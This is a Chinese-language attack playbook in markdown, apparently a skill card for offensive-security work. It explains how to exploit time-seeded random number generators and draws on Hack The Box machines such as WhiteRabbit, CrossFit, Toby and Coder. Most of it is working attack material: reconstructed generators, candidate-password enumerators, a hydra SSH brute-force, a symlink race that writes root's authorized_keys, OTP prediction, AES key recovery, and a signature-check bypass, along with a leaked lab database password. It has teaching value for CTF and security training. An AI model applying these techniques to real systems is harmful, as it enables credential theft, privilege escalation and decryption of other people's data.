---
name: 'weak-prng-predictable-seed'
description: '目标自己"生成"口令/OTP/token,或 IV/Key/文件名由某个种子派生时来查:反编译/读源码确认 seed 来源 —— 出现 srand / rand() / random.seed / new Random / mt_rand / getrandbits,入参是 gettimeofday / time(NULL) / DateTime.Now / UNIX epoch,只要拿到"生成时刻"的旁证(command_log、文件 mtime、cron 分钟对齐)就能离线重放或枚举时间窗口。（检索词：PRNG/prng/weak randomness/weak-randomness/predictable seed/predictable-seed/srand/rand()/random.seed/new Random/gettimeofday/time(NULL)/seed/mt_rand/getrandbits/password generator/password-generator/OTP/token prediction/token-prediction/可预测随机数/弱随机/时间种子/种子爆破/OTP 预测/口令生成器/弱 PRNG）'
whenToUse: '看到一个"随机"生成的值(口令/OTP/token/IV/Key/临时文件名),生成它的程序或源码在手,且能找到它被生成的时间点'
metadata: { domain: crypto, tier: T2 }
---

# 可预测随机数:种子、时间与复用

> 来自 Insane 官方 WP 逐台回核,**6 台命中**:WhiteRabbit / CrossFit / Toby / Coder / Sorcery / Kryptos。

🔑 攻击面不是"算法弱",是 **seed 的熵不够**:seed 来自时间 → 这个值退化成可本地重放的时间函数,把生成器代码抄一遍即可。

## 触发信号

- 目标自己生成口令/OTP 并交给你:生成器二进制(`/opt/neo-password-generator/neo-password-generator`)、`api_password()`
- 反汇编/源码里出现 `srand(` / `rand()` / `random.seed(` / `new Random(` / `mt_rand(` / `getrandbits(`,seed 入参是 `time(NULL)` / `gettimeofday` / `DateTime.Now` / UNIX epoch
- 文件名由 `rand()` 拼出(`rand().'.tar'`);IV/Key 由 `Random(seed)` 的 `NextBytes` 产出
- **能拿到"生成时刻"的旁证**(支点):`command_log`、文件 mtime、日志行、cron 的 `hh:mm:01`

## 前置验证

```bash
strings -a ./generator | grep -iE 'srand|rand|time|seed|Random'  # 先看怎么取 seed
date -r /mnt/x/s.blade.enc "+%s"          # 支点①:文件 mtime → epoch(Coder)
grep -riE 'password|passwd' command_log*  # 支点②:改密时刻(WhiteRabbit)
```

## 模式 1: C/C++ 的 `srand(time(NULL))` → 生成器反编译 + 时间窗口枚举

先把生成器拉回本地(`scp -i root/root/morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .`)再反编译:

```c
/* Ghidra 反编译 —— 逐字抄,这是重放的唯一依据 */
gettimeofday(&local_28,(__timezone_ptr_t)0x0);
generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);   /* 毫秒 */
srand(param_1);                                     /* generate_password(uint param_1) */
for (local_34 = 0; local_34 < 0x14; local_34++) {   /* 0x14 = 20 字符 */
    iVar1 = rand();
    local_28[local_34] =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e];
}
```

**窗口 A(毫秒级)**:日志只给秒级 `tv_sec` → 在本地 `for ms in 0..999: srand(timestamp*1000+ms)`,再取 20 次 `CHARSET[rand()%62]`(`CHARSET` 同上),输出 1000 行候选。

```bash
gcc generate_passwords.c -o generate_passwords && ./generate_passwords > passwords.txt
hydra -l neo -P passwords.txt ssh://whiterabbit.htb
# [22][ssh] login: neo  password: <REDACTED>
```

**窗口 B(分钟对齐)**:`pspy` 看到 cron 在 `hh:mm:01` 跑 → seed 是"下一分钟的 :01"。

```c
/* CrossFit 的 rand.c —— 注释写的就是 HH:MM+1:01 */
time_t curr_time = time(NULL);
int seed = curr_time - (curr_time % 60) + 61;
srand(seed); printf("%d", rand());
```

```bash
filename=`./rand`; filename="${filename}1337"
md5=`echo -n $filename|md5sum|awk '{print $1}'`
ln -s /root/.ssh/authorized_keys /var/local/$md5      # 预测落点后抢建 symlink
mysql -u crossfit -p"oeLoo~y2baeni" crossfit -e "insert into messages(id,name,email,message) \
  values(1337,'sshrsa','root@kali','<your pubkey>')"
```

| 机器 | 细节 |
|------|------|
| WhiteRabbit | 20 字符 / 62 字符集 / `rand() % 0x3e`;`command_log` 给出改密时刻 `2024-08-30 14:40:42` → 枚举 1000 个毫秒候选 → hydra 破出 `neo` |
| CrossFit | root cron 每分钟跑 `dbmsg`;`rand()` 与行 id 拼接后 `md5sum`(`snprintf(local_98,0x30,"%s%s","/var/local/",local_f8)`)得临时名 → `ln -s` 抢建 → 任意文件写 → root |
| PlayerTwo | PHP `rand().'.tar'` / `rand().'.bin'` 生成上传落点(该 WP 走子目录绕过,原语仍成立) |

🔴 两种窗口别混用:毫秒级枚举 1000 次,分钟对齐算 1 次;`srand` 的 `unsigned int` 截断也要照抄。
🔴 抢建 symlink 是竞态,必须在 cron 触发前完成 `ln -s`;完整原语见 `symlink-attack-patterns`。

## 模式 2: 托管语言的 `Random(seed)` → 同一算法本地重放

```python
# Toby: Flask /api/password
random.seed(int(time.time()))
password = ''.join([random.choice(chars) for x in range(32)])   # chars = ascii_letters+digits
for i in range(1625875200, 1625961600):    # 源码注释给出凭据落地日期 → 枚举那两天每一秒
    random.seed(int(i))
    f.write(''.join([random.choice(chars) for x in range(32)])+"\n")
```

| 机器 | 细节 |
|------|------|
| Toby | `# 10/07/21 - removed creds and placed in environment` 这句注释就是窗口边界;枚举 86400 秒 → john 破出 Wireshark 抓到的 `$mysqlna$` hash |
| Sorcery | C# `new Random(DateTime.Now.Minute / 10 + (int)GetCurrentExecutableOwner().UserId).Next(100000, 999999)`;uid=2003 → `new Random(DateTime.Now.Minute/10 + 2003)` 本地算出 OTP `699914`,拼成 `-7eAZDp9-f9mg699914` |

🔴 别凭记忆写 PRNG:各语言实现不同,必须用目标同版本运行时跑。

## 模式 3: 加密材料由可预测种子派生(Coder)

条件:IV/Key/salt 由同一个时间种子派生 → **枚举种子即可解密**。

```csharp
long value = DateTimeOffset.Now.ToUnixTimeSeconds();
Random random = new Random(Convert.ToInt32(value));
byte[] array  = new byte[16]; random.NextBytes(array);    // IV
byte[] array2 = new byte[32]; random.NextBytes(array2);   // Key
byte[] array3 = AES.EncryptFile(fileInfo.Name, destFile, array2, array);
```

支点:保住原始 mtime —— `sudo mount -t cifs \\\\dc01.coder.htb\\Development /mnt -o vers=3.0,username=guest,serverino,sec=ntlmsspi` + `date -r /mnt/Temporary\ Projects/s.blade.enc "+%s"` → `1668205028`。dnSpy 改 `Main()` 硬编码 `new Random(1668205028)`,先 `NextBytes` 16 字节 IV 再 32 字节 Key,复用原 `DecryptFile`。

| 机器 | 细节 |
|------|------|
| Coder | `.enc` 加密器把 IV+Key 都从 epoch 派生;`date -r` 从 mtime 反推 `1668205028` → dnSpy 硬编码 seed → 解出文件 |

🔴 顺序敏感:同一 `Random` 连续 `NextBytes` 两次,先 16 字节(IV)再 32 字节(Key);写反解出来是垃圾。

## 模式 4: 自定义 PRNG → 先做唯一性统计

```python
def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647; g = 2255412; ret = 0; ths = round((p-1)/2)
    for i in range(32*8):
        seed = pow(g,seed,p)
        if seed > ths: ret += 2**i
    return ret
sk = SigningKey.from_secret_exponent(secure_rng(random.getrandbits(128)) + 1, curve=NIST384p)
```

```bash
for i in `seq 1 11000`; do python rng.py >> randoms_nums.lst; done
cat random_nums.lst | sort -u > uniq_values.txt; wc -l uniq_values.txt   # 11000 → 209
# 209 个候选离线签任意 payload → 打 /eval 的签名校验
```

| 机器 | 细节 |
|------|------|
| Kryptos | `secure_rng()` 输出空间被 `pow(g,seed,p)` 迭代收敛;11000 → 209 unique → 枚举 209 个签名密钥,绕过 `/eval` 校验 |

🔴 先统计再分析:`sort -u | wc -l` 就能判定"输出空间小到能枚举";别一上来做符号执行/线性代数(那是 `challenge-crypto-prng` 的路子)。

## 快速检查清单

```bash
[ ] 生成器本体拿到?反编译看过 srand/rand/random.seed/new Random?
[ ] seed 是时间吗?tv_sec 还是毫秒?分钟对齐还是 cron 秒偏移?
[ ] "生成时刻"旁证找到(command_log / mtime / 日志 / cron 周期)?
[ ] 字符集、取模、NextBytes 顺序逐字对齐?用同版本运行时跑?
```

## 教训

1. **seed 的熵就是全部安全性** —— 算法是 libc 的 `rand()` 无所谓,只要 seed 有 128 位真随机;反过来 AES 配时间种子一样全废(Coder)。
2. **支点是"生成时刻"** —— WhiteRabbit 靠 `command_log`,CrossFit 靠 `pspy` 的 `hh:mm:01`,Coder 靠 `date -r` 的 mtime,Toby 靠源码注释日期。窗口精度搞错就是 1000 倍浪费。
3. 🔴 **重放逐字照抄** —— 字符集、`% 0x3e`、`unsigned int` 截断、`NextBytes` 顺序任一处偏差都让候选表作废;下载还会覆盖 mtime 丢掉 `.enc` 的 seed(Coder)。⚠️ 源码出现 ≠ 被利用(`Scanned` 的 `srand(time(0))` 从未进攻击链)。

## 相关卡

- `challenge-crypto-prng` —— PRNG 输出空间不小、需符号执行时转过去
- `crypto-classic-attack-patterns` —— 拿到密钥材料后打 padding oracle / 字节翻转 / 密钥流复用
- `password-attacks` —— 候选表生成之后:hydra / hashcat 掩码 / john
- `symlink-attack-patterns` —— 预测出落点后抢建符号链接的完整原语
